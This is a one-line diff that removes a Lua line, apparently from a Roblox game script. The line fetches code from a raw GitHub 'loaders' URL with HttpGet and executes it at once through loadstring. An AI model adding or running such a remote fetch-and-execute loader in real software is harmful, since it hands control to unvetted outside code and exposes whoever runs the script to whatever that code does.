@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/SnatchJailer/loaders/main/loaders/mukbang-game-testing-spam7-e88o9duvmjvzv4.lua"))()
